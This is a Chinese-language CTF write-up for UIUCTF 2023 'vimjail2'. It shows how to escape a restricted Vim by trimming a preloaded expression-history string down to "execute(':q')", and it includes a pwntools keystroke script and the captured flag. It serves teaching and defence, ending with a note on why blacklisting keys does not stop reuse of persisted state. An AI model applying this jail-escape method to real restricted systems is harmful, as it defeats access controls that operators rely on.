# UIUCTF 2023 vimjail2 Writeup

## 题目简述

这一版在 restricted Vim 退出后由入口脚本执行 `cat /flag.txt`，因此目标只是让 Vim 正常退出。配置仍允许使用插入模式表达式寄存器，但几乎所有英文字母以及常用符号在命令行模式中都会被映射成下划线，无法直接键入 `execute(':q')`。

题目同时用 `-i /home/user/viminfo` 加载了一条预置表达式历史：一段以 `"excuse me, but Real Programmers ..."` 开头的长字符串。需要的字母 `execute` 按顺序散落在这条历史中。

## 解题过程

按 `Ctrl-R`、`=` 进入表达式寄存器，再按上箭头调出预置历史。当前命令行中已有全部字符，因此键盘映射不再妨碍使用方向键和退格删除字符。

在仓库给出的历史字符串中，保留偏移：

```text
1, 2, 6, 88, 118, 136, 154
```

对应字符正是：

```text
execute
```

从字符串尾部向前删除可以避免偏移变化。删除最后一个保留字符之后的 345 个字符，再依次跨过已保留字符并删除长度为 `17, 17, 29, 81, 3, 0` 的间隔，最后删除开头的双引号。此时光标位于 `execute` 开头，右移 7 次，再输入未被映射的 `(':q')` 并回车。

自动化脚本如下：

```python
from pwn import remote

CTRL_R = b"\x12"
UP = b"\x1b[A"
LEFT = b"\x1b[D"
RIGHT = b"\x1b[C"
BACKSPACE = b"\x08"

io = remote("vimjail2.chal.uiuc.tf", 1337)
io.recvuntil(b"VIM - Vi IMproved")

payload = CTRL_R + b"=" + UP
payload += BACKSPACE * 345
for gap in (17, 17, 29, 81, 3, 0):
    payload += LEFT + BACKSPACE * gap

# 越过首字母 e，删除它前面的双引号
payload += LEFT + BACKSPACE
# 回到 execute 末尾，补上未被映射的字符
payload += RIGHT * len(b"execute") + b"(':q')\n"

io.send(payload)
io.recvuntil(b"uiuctf{")
print((b"uiuctf{" + io.recvuntil(b"}")).decode())
```

`execute(':q')` 退出 Vim，入口脚本继续执行并输出：

```text
uiuctf{<left><left><left><left>_c364201e0d86171b}
```

## 方法总结

命令行字符黑名单只限制“新输入”，却没有清除 Vim 持久化的历史。攻击者可以调出已有文本，再用光标移动和删除把它裁剪成可执行表达式。这类编辑器 jail 必须同时处理历史、寄存器、swap 文件、补全和表达式求值等状态通道；仅映射键盘字符无法阻止已有状态被重新组合成 payload。
